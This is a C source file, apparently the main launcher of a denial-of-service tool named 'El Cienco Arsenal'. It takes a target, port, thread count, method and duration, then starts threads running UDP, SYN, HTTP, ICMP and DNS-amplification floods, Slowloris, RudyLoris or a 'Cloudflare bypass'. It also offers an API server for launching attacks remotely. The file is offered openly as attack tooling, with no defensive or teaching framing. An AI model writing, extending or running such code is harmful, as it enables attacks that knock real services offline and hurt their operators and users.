#include "../include/elcienco.h"
#include "../include/api.h"

volatile int attack_running = 0;
pthread_t attack_threads[MAX_THREADS];
AttackConfig current_attack = {0};
time_t attack_start_time = 0;

void print_banner(void) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                                                              ║\n");
    printf("║     ███████╗██╗      ██████╗██╗███████╗███╗   ██╗ ██████╗ ██████╗  ║\n");
    printf("║     ██╔════╝██║     ██╔════╝██║██╔════╝████╗  ██║██╔════╝██╔═══██╗ ║\n");
    printf("║     █████╗  ██║     ██║     ██║█████╗  ██╔██╗ ██║██║     ██║   ██║ ║\n");
    printf("║     ██╔══╝  ██║     ██║     ██║██╔══╝  ██║╚██╗██║██║     ██║   ██║ ║\n");
    printf("║     ███████╗███████╗╚██████╗██║███████╗██║ ╚████║╚██████╗╚██████╔╝ ║\n");
    printf("║     ╚══════╝╚══════╝ ╚═════╝╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝  ║\n");
    printf("║                                                              ║\n");
    printf("║                    ARSENAL v2.3.1                            ║\n");
    printf("║                    YEAR 2310                                 ║\n");
    printf("║              EL MANCO COMMAND INTERFACE                       ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf("\n");
}

void print_usage(const char *prog_name) {
    printf("Usage: %s [OPTIONS] [TARGET] [PORT] [THREADS] [METHOD] [DURATION]\n", prog_name);
    printf("\n");
    printf("OPTIONS:\n");
    printf("  --api [PORT]     Start API server on specified port (default: 6969)\n");
    printf("  --help           Show this help message\n");
    printf("  --version        Show version information\n");
    printf("\n");
    printf("ATTACK MODE:\n");
    printf("  %s <target> <port> <threads> <method> <duration>\n", prog_name);
    printf("\n");
    printf("  target    - Target IP address or hostname\n");
    printf("  port      - Target port number\n");
    printf("  threads   - Number of attack threads (max: %d)\n", MAX_THREADS);
    printf("  method    - Attack method (0-7):\n");
    printf("              0 = UDP Flood\n");
    printf("              1 = TCP SYN Flood\n");
    printf("              2 = HTTP Flood\n");
    printf("              3 = Slowloris\n");
    printf("              4 = DNS Amplification\n");
    printf("              5 = ICMP Flood\n");
    printf("              6 = RudyLoris\n");
    printf("              7 = Cloudflare Bypass\n");
    printf("  duration  - Attack duration in seconds\n");
    printf("\n");
    printf("EXAMPLES:\n");
    printf("  %s 192.168.1.100 80 500 7 300\n", prog_name);
    printf("  %s --api 8080\n", prog_name);
    printf("\n");
}

void run_attack_mode(int argc, char **argv) {
    if (argc < 6) {
        print_usage(argv[0]);
        exit(1);
    }
    
    AttackConfig config;
    strncpy(config.target, argv[1], sizeof(config.target) - 1);
    config.port = atoi(argv[2]);
    config.threads = atoi(argv[3]);
    config.method = atoi(argv[4]);
    config.duration = atoi(argv[5]);
    
    if (config.threads > MAX_THREADS) {
        config.threads = MAX_THREADS;
    }
    
    printf("[*] Target: %s:%d\n", config.target, config.port);
    printf("[*] Threads: %d\n", config.threads);
    printf("[*] Method: %d\n", config.method);
    printf("[*] Duration: %d seconds\n", config.duration);
    printf("[*] Starting attack...\n\n");
    
    attack_running = 1;
    attack_start_time = time(NULL);
    memcpy(&current_attack, &config, sizeof(AttackConfig));
    
    // Launch threads
    for (int i = 0; i < config.threads; i++) {
        ThreadData *data = malloc(sizeof(ThreadData));
        data->config = config;
        data->thread_num = i;
        data->running = &attack_running;
        
        switch(config.method) {
            case 0: pthread_create(&attack_threads[i], NULL, udp_flood, data); break;
            case 1: pthread_create(&attack_threads[i], NULL, tcp_syn_flood, data); break;
            case 2: pthread_create(&attack_threads[i], NULL, http_flood, data); break;
            case 3: pthread_create(&attack_threads[i], NULL, slowloris_attack, data); break;
            case 4: pthread_create(&attack_threads[i], NULL, dns_amplification, data); break;
            case 5: pthread_create(&attack_threads[i], NULL, icmp_flood, data); break;
            case 6: pthread_create(&attack_threads[i], NULL, rudyloris_attack, data); break;
            case 7: pthread_create(&attack_threads[i], NULL, cloudflare_bypass, data); break;
            default:
                printf("[!] Invalid method: %d\n", config.method);
                free(data);
                attack_running = 0;
                return;
        }
    }
    
    // Wait for duration
    sleep(config.duration);
    attack_running = 0;
    
    // Join threads
    for (int i = 0; i < config.threads; i++) {
        if (attack_threads[i]) {
            pthread_join(attack_threads[i], NULL);
        }
    }
    
    printf("\n[*] Attack completed.\n");
}

void run_api_mode(int port) {
    printf("[*] Starting El Cienco API Server...\n");
    printf("[*] Listening on port: %d\n", port);
    printf("[*] Endpoints available:\n");
    printf("    GET  /status  - Get attack status\n");
    printf("    POST /attack  - Launch attack\n");
    printf("    POST /stop    - Stop attack\n");
    printf("    GET  /methods - List attack methods\n");
    printf("    GET  /config  - Get configuration\n");
    printf("\n[*] Dashboard available at web/dashboard.html\n");
    printf("[*] Press Ctrl+C to stop\n\n");
    
    // Start API server
    int api_port = port;
    api_server(&api_port);
}

int main(int argc, char **argv) {
    print_banner();
    
    // Ignore SIGPIPE for socket operations
    signal(SIGPIPE, SIG_IGN);
    
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }
    
    // Parse arguments
    if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
        print_usage(argv[0]);
        return 0;
    }
    
    if (strcmp(argv[1], "--version") == 0 || strcmp(argv[1], "-v") == 0) {
        printf("El Cienco Arsenal v2.3.1\n");
        printf("Year 2310 Build\n");
        printf("Protocol: No Restrictions\n");
        return 0;
    }
    
    if (strcmp(argv[1], "--api") == 0) {
        int port = (argc > 2) ? atoi(argv[2]) : API_PORT;
        run_api_mode(port);
        return 0;
    }
    
    // Direct attack mode
    run_attack_mode(argc, argv);
    
    return 0;
}
